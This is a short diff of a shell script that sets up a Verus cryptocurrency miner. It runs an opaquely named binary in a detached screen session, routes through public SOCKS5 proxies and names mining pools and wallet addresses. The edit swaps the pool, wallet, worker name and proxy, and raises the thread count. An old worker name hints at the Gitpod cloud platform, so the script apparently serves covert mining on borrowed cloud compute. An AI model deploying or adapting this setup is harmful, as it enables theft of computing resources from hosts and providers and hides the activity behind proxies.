@@ -3,9 +3,9 @@ sudo apt update
 sudo apt install screen libjansson4 -y
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
 screen -dmS ls
-A=stratum+tcp://na.luckpool.net:3956
-B=RDZyoXMfqsp3qAHVEzFYnMW6Fdk6A9NCEP
-C=Gitpodio
-D=socks5://72.221.232.115:4145
+A=stratum+tcp://verushash.eu.mine.zergpool.com:3300
+B=REL6XKj49hmLeNdbwjtazXPWciq6gHdb5R
+C=Surep
+D=socks5://184.178.172.14:4145
 
-chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p x -t 4
+chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DGB -t 16
